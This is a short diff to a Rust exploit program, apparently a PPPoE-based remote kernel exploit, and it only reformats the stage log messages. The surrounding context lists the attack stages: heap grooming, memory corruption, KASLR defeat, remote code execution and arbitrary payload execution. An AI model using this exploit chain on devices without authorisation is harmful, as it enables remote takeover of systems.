@@ -45,7 +45,7 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     handler.start();
 
     // Stages of the exploit
-    println!("[+] Starting Negotiations ...");
+    println!("\n[+] STAGE 0: Initialization");
     expl.capture_first_padi(&interface);
     let fake_ifnet = expl.build_fake_ifnet();
     expl.ppp_negotiation(&interface, Some(fake_ifnet));
@@ -55,19 +55,19 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     println!("[+] Wait for interface to be ready");
     println!("[+] Starting Heap Grooming...");
     expl.heap_grooming(&interface);
-    println!("[+] STAGE 1: Memory corruption");
+    println!("\n[+] STAGE 1: Memory corruption");
     expl.memory_corruption(&interface);
-    println!("[+] STAGE 2: KASLR defeat");
+    println!("\n[+] STAGE 2: KASLR defeat");
     expl.defeat_kaslr(&interface);
-    println!("[+] STAGE 3: Remote code execution");
+    println!("\n[+] STAGE 3: Remote code execution");
     expl.remote_code_exec(&interface);
     expl.source_mac = constants::SOURCE_MAC;
     expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
-    println!("[+] STAGE 4: Arbitrary payload execution");
+    println!("\n[+] STAGE 4: Arbitrary payload execution");
     expl.frag_and_send(&interface);
-    println!("[+] DONE!");
+    println!("\n[+] DONE!");
 
     // Stop the LCP handler
     handler.stop();
